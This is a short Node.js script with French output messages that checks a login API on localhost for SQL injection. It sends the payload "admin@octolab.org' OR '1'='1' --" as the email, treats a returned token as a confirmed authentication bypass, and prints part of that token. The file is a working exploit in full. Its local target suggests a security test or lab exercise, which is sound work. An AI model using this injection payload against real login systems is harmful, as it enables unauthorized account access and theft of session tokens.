const axios = require('axios');

async function testSQLInjection() {
  console.log('🧪 Test simple de la vulnérabilité SQL injection');
  
  try {
    const response = await axios.post('http://localhost:3001/api/auth/login', {
      email: "admin@octolab.org' OR '1'='1' --",
      password: 'anything'
    }, {
      validateStatus: () => true
    });
    
    console.log('Status:', response.status);
    console.log('Response:', JSON.stringify(response.data, null, 2));
    
    if (response.status === 200 && response.data.token) {
      console.log('✅ VULNÉRABILITÉ CONFIRMÉE - Bypass d\'authentification réussi!');
      console.log('🎯 Token obtenu:', response.data.token.substring(0, 30) + '...');
    } else {
      console.log('❌ Vulnérabilité non exploitée');
    }
    
  } catch (error) {
    console.error('Erreur:', error.message);
  }
}

testSQLInjection();